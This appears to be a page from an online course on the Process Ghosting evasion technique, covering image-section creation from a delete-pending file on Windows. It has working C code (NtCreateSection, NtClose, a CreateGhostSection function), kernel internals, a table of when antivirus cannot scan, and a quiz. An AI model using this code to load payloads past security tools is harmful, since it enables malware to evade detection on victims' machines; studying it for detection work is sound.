@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: Section Mapping from Ghost - ProcessGhosting Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A8;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#6366f1;--accent2:#4f46e5;--gradient:linear-gradient(135deg,#6366f1,#4f46e5)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ProcessGhosting</h2>
+<span>Ghost Process Evasion</span>
+</div>
+<a class="home-link" href="../ProcessGhosting_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Creation Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. PE Tampering Overview</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. File States &amp; Delete-Pending</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Creating the Ghost File</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module5.html"><span>5. Section Mapping from Ghost</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Process &amp; Thread Creation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. AV/EDR Scan Timing</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 5: Section Mapping from Ghost</h1>
+<p class="subtitle">Creating an image section from the delete-pending file &mdash; the moment the ghost image becomes permanent in kernel memory.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how <code>NtCreateSection</code> with <code>SEC_IMAGE</code> creates an image section from the delete-pending file handle, the kernel structures that are created (<code>CONTROL_AREA</code>, <code>SUBSECTION</code>), why the section persists after the file is deleted, and how to close the file handle to trigger the deletion while keeping the section alive.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Creating the Image Section</h2>
+
+<p>With the ghost file handle from Module 4 (delete-pending, containing the malicious PE), we now create an image section. This is the pivotal step &mdash; it captures the PE content into a kernel object that will outlive the file:</p>
+
+<pre><code>HANDLE hSection = NULL;
+
+NTSTATUS status = NtCreateSection(
+    &hSection,          // receives the section handle
+    SECTION_ALL_ACCESS, // full access to the section
+    NULL,               // no object attributes
+    NULL,               // MaximumSize (auto from PE headers)
+    PAGE_READONLY,      // initial page protection
+    SEC_IMAGE,          // IMAGE section type
+    hFile               // the delete-pending file handle
+);</code></pre>
+
+<div class="card">
+<h4>Parameter Breakdown</h4>
+<table>
+<tr><th>Parameter</th><th>Value</th><th>Significance</th></tr>
+<tr><td><code>SectionHandle</code></td><td><code>&hSection</code></td><td>Output: the section handle we will use for process creation</td></tr>
+<tr><td><code>DesiredAccess</code></td><td><code>SECTION_ALL_ACCESS</code></td><td>Full access including map, query, and extend rights</td></tr>
+<tr><td><code>MaximumSize</code></td><td><code>NULL</code></td><td>For <code>SEC_IMAGE</code>, the size is determined by the PE&rsquo;s <code>SizeOfImage</code> field in the optional header</td></tr>
+<tr><td><code>SectionPageProtection</code></td><td><code>PAGE_READONLY</code></td><td>Base protection; individual pages get per-section protections from PE headers</td></tr>
+<tr><td><code>AllocationAttributes</code></td><td><code>SEC_IMAGE</code></td><td>Parse the file as a PE image, creating an IMAGE_SECTION_OBJECT</td></tr>
+<tr><td><code>FileHandle</code></td><td><code>hFile</code></td><td>The delete-pending file containing the malicious PE</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. What Happens Inside the Kernel</h2>
+
+<p>When the kernel processes <code>NtCreateSection</code> with <code>SEC_IMAGE</code>, it performs the following operations internally:</p>
+
+<div class="card">
+<h4>Kernel Section Creation Steps</h4>
+<ol>
+<li><strong>PE Validation</strong>: The memory manager reads the MZ and PE headers from the file. It validates the magic numbers, machine type, number of sections, and alignment values.</li>
+<li><strong>CONTROL_AREA Allocation</strong>: A <code>CONTROL_AREA</code> structure is allocated in kernel pool memory. This structure links the section to its backing file object and tracks reference counts.</li>
+<li><strong>SUBSECTION Chain</strong>: For each PE section (.text, .rdata, .data, etc.), a <code>SUBSECTION</code> structure is created describing the virtual address range, file offset, size, and page protection.</li>
+<li><strong>SECTION_OBJECT Creation</strong>: The top-level section object is created and linked to the control area.</li>
+<li><strong>File Object Reference</strong>: The <code>CONTROL_AREA</code> takes a reference to the <code>FILE_OBJECT</code>. This reference keeps the file object alive in kernel memory even after all user-mode handles are closed.</li>
+</ol>
+</div>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Kernel Object Relationships</h4>
+<div class="flow">
+<div class="flow box">SECTION_OBJECT<br><small>User handle: hSection</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">CONTROL_AREA<br><small>Ref to FILE_OBJECT</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">FILE_OBJECT<br><small>Backing file (delete-pending)</small></div>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. SEC_IMAGE PE Parsing</h2>
+
+<p>The <code>SEC_IMAGE</code> flag triggers full PE parsing by the memory manager. The kernel reads the PE headers to determine how to map the image into virtual memory:</p>
+
+<pre><code>// What the kernel reads from the PE to create subsections:
+// (conceptual representation)
+
+// From IMAGE_NT_HEADERS:
+//   OptionalHeader.ImageBase         -> preferred load address
+//   OptionalHeader.SizeOfImage       -> total virtual size
+//   OptionalHeader.AddressOfEntryPoint -> EP RVA
+//   OptionalHeader.SectionAlignment  -> virtual alignment
+//   OptionalHeader.FileAlignment     -> file alignment
+
+// From each IMAGE_SECTION_HEADER:
+//   VirtualAddress    -> RVA of this section
+//   VirtualSize       -> virtual size
+//   PointerToRawData  -> file offset
+//   SizeOfRawData     -> file size
+//   Characteristics   -> permissions (R/W/X)</code></pre>
+
+<table>
+<tr><th>PE Section</th><th>Typical Protection</th><th>Kernel Subsection</th></tr>
+<tr><td><code>.text</code></td><td><code>PAGE_EXECUTE_READ</code></td><td>Subsection with <code>MM_EXECUTE_READ</code></td></tr>
+<tr><td><code>.rdata</code></td><td><code>PAGE_READONLY</code></td><td>Subsection with <code>MM_READONLY</code></td></tr>
+<tr><td><code>.data</code></td><td><code>PAGE_READWRITE</code></td><td>Subsection with <code>MM_READWRITE</code> (copy-on-write)</td></tr>
+<tr><td><code>.rsrc</code></td><td><code>PAGE_READONLY</code></td><td>Subsection with <code>MM_READONLY</code></td></tr>
+</table>
+
+<div class="card green">
+<h4>Image Section vs Data Section</h4>
+<p>A <code>SEC_IMAGE</code> section is fundamentally different from a <code>SEC_COMMIT</code> or <code>SEC_RESERVE</code> data section. The image section stores parsed PE metadata and maps each PE section individually with appropriate protections. A data section just maps raw bytes. Only image sections can be used with <code>NtCreateProcessEx</code> to create processes.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Why the Section Survives File Deletion</h2>
+
+<p>This is the core of Process Ghosting&rsquo;s power. The section persists after the file is deleted because of <strong>reference counting</strong> in the kernel:</p>
+
+<div class="card highlight">
+<h4>Reference Counting Chain</h4>
+<ol>
+<li>The <code>SECTION_OBJECT</code> holds a reference to the <code>CONTROL_AREA</code></li>
+<li>The <code>CONTROL_AREA</code> holds a reference to the <code>FILE_OBJECT</code></li>
+<li>As long as any reference to the <code>CONTROL_AREA</code> exists, the <code>FILE_OBJECT</code> stays alive</li>
+<li>The <code>FILE_OBJECT</code> keeps the file data accessible even after the directory entry is removed</li>
+</ol>
+<p>When we close the user-mode file handle (<code>hFile</code>), the file&rsquo;s delete-pending state triggers removal of the directory entry and MFT deallocation. But the <code>FILE_OBJECT</code> in kernel memory is not destroyed because the section still references it through the <code>CONTROL_AREA</code>. The file data (PE content) remains accessible through the section&rsquo;s page-in mechanism.</p>
+</div>
+
+<pre><code>// After section creation, close the file handle
+// This triggers the actual file deletion from disk
+NtClose(hFile);
+hFile = NULL;
+
+// At this point:
+// - File is DELETED from disk (no directory entry, MFT freed)
+// - hSection is still valid
+// - Section's CONTROL_AREA still references the FILE_OBJECT
+// - PE content is still accessible through the section
+// - NtCreateProcessEx can still use hSection</code></pre>
+
+<!-- ============================================================ -->
+<h2>5. The CONTROL_AREA in Detail</h2>
+
+<p>The <code>CONTROL_AREA</code> is the key kernel structure that bridges files and sections. For an image section, its relevant fields include:</p>
+
+<pre><code>// Simplified CONTROL_AREA structure (Windows 10+)
+typedef struct _CONTROL_AREA {
+    PFILE_OBJECT    FilePointer;        // backing file object
+    ULONG           NumberOfSectionReferences;  // section ref count
+    ULONG           NumberOfPfnReferences;      // page frame refs
+    ULONG           NumberOfMappedViews;        // mapped view count
+    ULONG           NumberOfUserReferences;     // user-mode refs
+    ULONG           FlushInProgressCount;
+    ULONG_PTR       Flags;              // includes IMAGE flag
+    PSEGMENT        Segment;            // segment containing pages
+    PSUBSECTION     FirstSubsection;    // head of subsection list
+    // ... additional fields
+} CONTROL_AREA, *PCONTROL_AREA;</code></pre>
+
+<p>The <code>NumberOfSectionReferences</code> field tracks how many section objects reference this control area. As long as it is greater than zero, the control area (and its file object pointer) stays alive. When we create a process from the section, the process&rsquo;s virtual address space adds mapped view references, further keeping the control area alive.</p>
+
+<!-- ============================================================ -->
+<h2>6. Verifying the Section</h2>
+
+<p>Before proceeding to process creation, we can verify the section is valid by querying its basic information:</p>
+
+<pre><code>// Query section information to verify
+SECTION_BASIC_INFORMATION sectionInfo = { 0 };
+ULONG retLen = 0;
+
+status = NtQuerySection(
+    hSection,
+    SectionBasicInformation,
+    &sectionInfo,
+    sizeof(sectionInfo),
+    &retLen
+);
+
+if (NT_SUCCESS(status)) {
+    // sectionInfo.Size contains the image size
+    // sectionInfo.Attributes should include SEC_IMAGE
+    printf("Section size: 0x%llx\n", sectionInfo.Size.QuadPart);
+    printf("Attributes: 0x%x\n", sectionInfo.Attributes);
+    // Attributes & SEC_IMAGE should be non-zero
+}</code></pre>
+
+<p>We can also query the image information to get the entry point and other PE metadata:</p>
+
+<pre><code>// Query section image information
+SECTION_IMAGE_INFORMATION imageInfo = { 0 };
+
+status = NtQuerySection(
+    hSection,
+    SectionImageInformation,
+    &imageInfo,
+    sizeof(imageInfo),
+    &retLen
+);
+
+if (NT_SUCCESS(status)) {
+    printf("Entry point: %p\n", imageInfo.TransferAddress);
+    printf("Stack reserve: 0x%llx\n",
+        imageInfo.MaximumStackSize);
+    printf("Image base: %p\n",
+        imageInfo.ImageBase);
+    // TransferAddress = ImageBase + AddressOfEntryPoint
+}</code></pre>
+
+<div class="card">
+<h4>SECTION_IMAGE_INFORMATION Key Fields</h4>
+<table>
+<tr><th>Field</th><th>Type</th><th>Meaning</th></tr>
+<tr><td><code>TransferAddress</code></td><td><code>PVOID</code></td><td>Absolute address of the entry point (ImageBase + EP RVA)</td></tr>
+<tr><td><code>MaximumStackSize</code></td><td><code>ULONG</code></td><td>Stack reserve size from PE optional header</td></tr>
+<tr><td><code>CommittedStackSize</code></td><td><code>ULONG</code></td><td>Stack commit size from PE optional header</td></tr>
+<tr><td><code>SubSystemType</code></td><td><code>ULONG</code></td><td>GUI (2), Console (3), etc.</td></tr>
+<tr><td><code>ImageBase</code></td><td><code>PVOID</code></td><td>Preferred load address from PE optional header</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Timeline of Events</h2>
+
+<p>Here is the complete timeline from file creation through section persistence:</p>
+
+<table>
+<tr><th>Step</th><th>API Call</th><th>File on Disk</th><th>Section in Kernel</th><th>AV Can Scan?</th></tr>
+<tr><td>1</td><td><code>NtCreateFile</code></td><td>Empty file exists</td><td>None</td><td>Yes, but file is empty</td></tr>
+<tr><td>2</td><td><code>NtSetInformationFile</code></td><td>Delete-pending, empty</td><td>None</td><td>No (STATUS_DELETE_PENDING)</td></tr>
+<tr><td>3</td><td><code>NtWriteFile</code></td><td>Delete-pending, has PE</td><td>None</td><td>No (STATUS_DELETE_PENDING)</td></tr>
+<tr><td>4</td><td><code>NtCreateSection</code></td><td>Delete-pending, has PE</td><td>IMAGE section created</td><td>No (STATUS_DELETE_PENDING)</td></tr>
+<tr><td>5</td><td><code>NtClose(hFile)</code></td><td>DELETED</td><td>Section persists</td><td>No (file gone)</td></tr>
+<tr><td>6</td><td><code>NtCreateProcessEx</code></td><td>DELETED</td><td>Mapped into process</td><td>No (file gone)</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>8. Combined Code: Ghost File + Section</h2>
+
+<pre><code>// Complete: create ghost file and section
+bool CreateGhostSection(
+    LPCWSTR ghostPath,
+    BYTE* payload, DWORD payloadSize,
+    HANDLE* phSection)
+{
+    HANDLE hFile = NULL;
+    HANDLE hSection = NULL;
+    IO_STATUS_BLOCK iosb = { 0 };
+    NTSTATUS status;
+
+    // Phase 1: Create ghost file (Module 4)
+    status = CreateGhostFile(ghostPath,
+        payload, payloadSize, &hFile);
+    if (!NT_SUCCESS(status)) return false;
+
+    // Phase 2: Create image section from ghost
+    status = NtCreateSection(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        NULL, NULL,
+        PAGE_READONLY,
+        SEC_IMAGE,
+        hFile);
+
+    // Close the file handle - triggers deletion
+    NtClose(hFile);
+
+    if (!NT_SUCCESS(status)) return false;
+
+    // Section is alive, file is dead
+    *phSection = hSection;
+    return true;
+}</code></pre>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="C">
+<p>Q1: Why does the image section persist after the backing file is deleted from disk?</p>
+<div class="quiz-btn" data-choice="A">A) The section data is copied into a new kernel buffer independent of the file</div>
+<div class="quiz-btn" data-choice="B">B) Windows automatically creates a backup of the file before deletion</div>
+<div class="quiz-btn" data-choice="C">C) The section's CONTROL_AREA holds a reference to the FILE_OBJECT, keeping the file data alive in kernel memory</div>
+<div class="quiz-btn" data-choice="D">D) The section is stored in the registry as a backup</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q2: What kernel structure links a section object to its backing file?</p>
+<div class="quiz-btn" data-choice="A">A) EPROCESS</div>
+<div class="quiz-btn" data-choice="B">B) CONTROL_AREA</div>
+<div class="quiz-btn" data-choice="C">C) PEB</div>
+<div class="quiz-btn" data-choice="D">D) TEB</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: What flag must be passed to NtCreateSection to have the kernel parse the file as a PE executable image?</p>
+<div class="quiz-btn" data-choice="A">A) SEC_IMAGE</div>
+<div class="quiz-btn" data-choice="B">B) SEC_COMMIT</div>
+<div class="quiz-btn" data-choice="C">C) SEC_RESERVE</div>
+<div class="quiz-btn" data-choice="D">D) SEC_FILE</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Prev: Creating the Ghost File</a>
+<a class="primary" href="module6.html">Next: Process &amp; Thread Creation &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
